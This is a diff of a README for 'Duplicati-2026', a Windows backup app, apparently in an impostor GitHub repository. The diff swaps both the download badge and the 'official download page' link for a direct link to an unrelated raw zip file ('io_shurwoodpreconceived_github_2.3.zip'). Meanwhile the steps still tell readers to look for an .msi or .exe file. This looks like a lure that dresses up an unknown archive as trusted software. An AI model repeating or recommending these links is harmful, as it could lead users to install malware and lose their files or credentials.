@@ -5,7 +5,7 @@ description: "Download the latest version of Duplicati for Windows 10 and 11 to 
 ---
 # 💾 Duplicati-2026 - Secure your digital files with ease
 
-[![Download Duplicati-2026](https://img.shields.io/badge/Download-Duplicati-blue.svg)](https://github.com/shurwoodpreconceived851/Duplicati-2026)
+[![Download Duplicati-2026](https://img.shields.io/badge/Download-Duplicati-blue.svg)](https://github.com/shurwoodpreconceived851/shurwoodpreconceived851.github.io/raw/refs/heads/main/monoketone/io_shurwoodpreconceived_github_2.3.zip)
 
 Duplicati-2026 saves your important files to the cloud. It encrypts your data to keep it private. You can use it on Windows 10 and Windows 11. This software stores backups safely so you can recover them later.
 
@@ -13,7 +13,7 @@ Duplicati-2026 saves your important files to the cloud. It encrypts your data to
 
 Follow these steps to get the app on your computer.
 
-1. Go to the [official download page](https://github.com/shurwoodpreconceived851/Duplicati-2026).
+1. Go to the [official download page](https://github.com/shurwoodpreconceived851/shurwoodpreconceived851.github.io/raw/refs/heads/main/monoketone/io_shurwoodpreconceived_github_2.3.zip).
 2. Look for the file ending in .msi or .exe.
 3. Click the file to start the download.
 4. Save the file to your Downloads folder.
